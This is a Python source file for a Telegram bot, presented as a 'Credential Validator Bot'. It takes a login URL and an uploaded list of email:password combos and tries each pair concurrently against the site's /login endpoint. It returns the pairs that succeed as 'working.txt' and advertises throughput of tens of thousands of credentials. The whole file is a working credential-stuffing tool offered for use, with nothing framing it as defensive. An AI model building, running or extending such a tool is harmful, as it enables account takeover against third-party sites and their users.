#!/usr/bin/env python3
"""
Credential Validator Bot
Railway-ready single file
"""

import os
import asyncio
import logging
import zipfile
from io import BytesIO
from typing import List, Optional
from dataclasses import dataclass
from datetime import datetime
from urllib.parse import urlparse, urljoin

import aiohttp
from telegram import (
    Update,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
)
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    ContextTypes,
    filters,
)

# ================= CONFIG =================

TELEGRAM_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
MAX_CONCURRENT = int(os.getenv("MAX_CONCURRENT", "10"))
REQUEST_TIMEOUT = int(os.getenv("REQUEST_TIMEOUT", "30"))

if not TELEGRAM_TOKEN:
    raise RuntimeError("TELEGRAM_BOT_TOKEN not set")

# ================= LOGGING =================

logging.basicConfig(
    format="%(asctime)s - %(levelname)s - %(message)s",
    level=logging.INFO,
)
logger = logging.getLogger(__name__)

# ================= DATA =================

@dataclass
class Credential:
    email: str
    password: str
    original_line: str

# ================= BOT =================

class CredentialValidatorBot:
    def __init__(self):
        self.max_concurrent = MAX_CONCURRENT
        self.timeout = aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
        self.session: Optional[aiohttp.ClientSession] = None
        self.user_states = {}
        self.working_creds: List[Credential] = []

    # ---------- /start ----------
    async def start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        welcome_msg = (
            "⚡ *Credential Validator Bot*\n\n"
            "Validates `email:password` combos against login pages\n\n"
            "*Workflow:*\n"
            "1️⃣ Send login URL\n"
            "2️⃣ Upload TXT file\n"
            "3️⃣ ✅ Get working creds back!\n\n"
            "*Performance:*\n"
            "• 500 creds ≈ 10 min\n"
            "• 20k creds ≈ 90 min"
        )

        keyboard = [[InlineKeyboardButton("🚀 Start Now", callback_data="begin")]]
        reply_markup = InlineKeyboardMarkup(keyboard)

        await update.message.reply_text(
            welcome_msg,
            parse_mode="Markdown",
            reply_markup=reply_markup,
        )

        self.user_states[update.effective_user.id] = {"step": "waiting_url"}

    # ---------- Button ----------
    async def button_handler(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        await query.answer()

        if query.data == "begin":
            await query.edit_message_text(
                "🔗 *Send login page URL:*\n\n"
                "`https://example.com/login`\n"
                "`https://site.com/auth`",
                parse_mode="Markdown",
            )

    # ---------- Messages ----------
    async def message_handler(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        text = update.message.text
        doc = update.message.document

        if user_id not in self.user_states:
            await update.message.reply_text("Use /start first")
            return

        state = self.user_states[user_id]

        # Step 1: URL
        if state["step"] == "waiting_url" and text:
            url = text.strip()
            if not self._validate_url(url):
                await update.message.reply_text(
                    "❌ Invalid URL\nSend like: `https://site.com/login`",
                    parse_mode="Markdown",
                )
                return

            state["url"] = url
            state["step"] = "waiting_file"

            await update.message.reply_text(
                f"✅ URL saved:\n`{url}`\n\n📁 Upload TXT file",
                parse_mode="Markdown",
            )
            return

        # Step 2: File
        if state["step"] == "waiting_file" and doc:
            if not doc.file_name.endswith(".txt"):
                await update.message.reply_text("❌ Only .txt files allowed")
                return

            await self._process_file(update, context, doc)

    # ---------- Helpers ----------
    def _validate_url(self, url: str) -> bool:
        try:
            parsed = urlparse(url)
            return parsed.scheme in ("http", "https") and parsed.netloc
        except Exception:
            return False

    async def _process_file(self, update: Update, context: ContextTypes.DEFAULT_TYPE, doc):
        user_id = update.effective_user.id
        state = self.user_states[user_id]
        url = state["url"]

        msg = await update.message.reply_text("📥 Processing file...")

        file = await context.bot.get_file(doc.file_id)
        content = await file.download_as_bytearray()
        creds = self._parse_creds(content.decode(errors="ignore"))

        if not creds:
            await msg.edit_text("❌ No valid credentials found")
            return

        state["creds"] = creds
        state["msg_id"] = msg.message_id

        await msg.edit_text(
            f"🚀 Starting validation\n"
            f"📊 {len(creds):,} credentials\n"
            f"🌐 {url}"
        )

        asyncio.create_task(self._run_validation(context, user_id, creds, url))

    def _parse_creds(self, content: str) -> List[Credential]:
        creds = []
        for line in content.splitlines():
            line = line.strip()
            if ":" in line:
                email, pwd = line.split(":", 1)
                if "@" in email and len(pwd) > 3:
                    creds.append(Credential(email, pwd, line))
        return creds

    async def _run_validation(self, context, user_id, creds, url):
        self.working_creds.clear()

        if not self.session:
            self.session = aiohttp.ClientSession(timeout=self.timeout)

        sem = asyncio.Semaphore(self.max_concurrent)

        async def check(cred):
            async with sem:
                return await self._attempt_login(url, cred)

        results = await asyncio.gather(*(check(c) for c in creds))
        self.working_creds = [c for c, ok in zip(creds, results) if ok]

        await self._finish(context, user_id, url)

    async def _attempt_login(self, base_url: str, cred: Credential) -> bool:
        try:
            async with self.session.post(
                urljoin(base_url, "/login"),
                data={"email": cred.email, "password": cred.password},
            ) as r:
                return r.status == 200
        except Exception:
            return False

    async def _finish(self, context, user_id, url):
        total = len(self.user_states[user_id]["creds"])
        working = len(self.working_creds)

        if working == 0:
            await context.bot.send_message(user_id, "❌ No working credentials")
        else:
            buf = BytesIO()
            text = "\n".join(c.original_line for c in self.working_creds)
            buf.write(text.encode())
            buf.seek(0)

            await context.bot.send_document(
                user_id,
                buf,
                filename="working.txt",
                caption=f"✅ {working}/{total} working\n🌐 {url}",
            )

        del self.user_states[user_id]

# ================= MAIN =================

async def main():
    app = Application.builder().token(TELEGRAM_TOKEN).build()
    bot = CredentialValidatorBot()

    app.add_handler(CommandHandler("start", bot.start))
    app.add_handler(CallbackQueryHandler(bot.button_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, bot.message_handler))
    app.add_handler(MessageHandler(filters.Document.ALL, bot.message_handler))

    logger.info("Bot started")
    await app.run_polling()

if __name__ == "__main__":
    asyncio.run(main())
